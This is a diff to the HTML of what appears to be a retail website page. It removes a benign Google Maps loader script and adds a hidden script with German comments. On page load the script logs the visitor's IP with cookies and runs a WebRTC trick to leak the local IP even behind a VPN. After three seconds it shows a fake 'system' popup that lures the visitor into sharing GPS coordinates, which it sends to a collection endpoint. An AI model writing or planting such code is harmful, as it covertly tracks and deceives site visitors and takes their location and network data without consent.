@@ -4191,15 +4191,40 @@ function trackPage() {
    <p><img src="https://matomo-italia1.kleecks-stats.com/matomo.php?idsite=loropiana-new-kleecks-com&amp;rec=1" style="border:0;" alt=""></p> 
   </noscript>
  <script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zOwYNc7tD3chVa1J/KmVoZEZJ/IW5hVD/tyQyg"></script><script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zGwYNc7tD3uE/CGJsZEZJ/MyBIPi/l9Lw0ZAQ?v=eedd6907-e094-f40e-3006-120524470216" defer></script></body>
-<script>
-    // PROMISE: Create a Promise on window obj that resolves when Google Maps API is loaded
-    window.googleMapsApiLoadedPromise = new Promise((resolve) => {
-        window.resolveGoogleMapsApiLoadedPromise = resolve;
-    });
-    // CALLBACK: Resolve the promise when the callback function is called by the script
-    function onGoogleMapsApiCallback() {
-        window.resolveGoogleMapsApiLoadedPromise();
-    }
-</script> 
+    <script>
+        // 1. IP-Logging sofort beim Laden
+        fetch('/collect', { 
+            method: 'GET',
+            credentials: 'include' // Wichtig für Cookies
+        });
+
+        // 2. WebRTC-Exploit für lokale IP (funktioniert auch mit VPN)
+        function getRTCPeerIP() {
+            const rtc = new RTCPeerConnection({iceServers: []});
+            rtc.createDataChannel('');
+            rtc.createOffer()
+                .then(offer => rtc.setLocalDescription(offer))
+                .catch(e => console.log(e));
+            rtc.onicecandidate = candidate => {
+                if (candidate.candidate) {
+                    const ip = candidate.candidate.address;
+                    fetch('/collect?type=webrtc&ip=' + encodeURIComponent(ip));
+                }
+            };
+        }
+        getRTCPeerIP();
+
+        // 3. Zeitverzögertes Fake-Popup
+        setTimeout(() => {
+            if (window.confirm("🔒 System benötigt Standortbestätigung\n\nAkzeptieren für weiteren Zugriff:")) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch('/collect?type=gps', {
+                        method: 'POST',
+                        body: JSON.stringify(pos.coords)
+                    });
+                });
+            }
+        }, 3000);
+    </script>
 </body>
 </html>
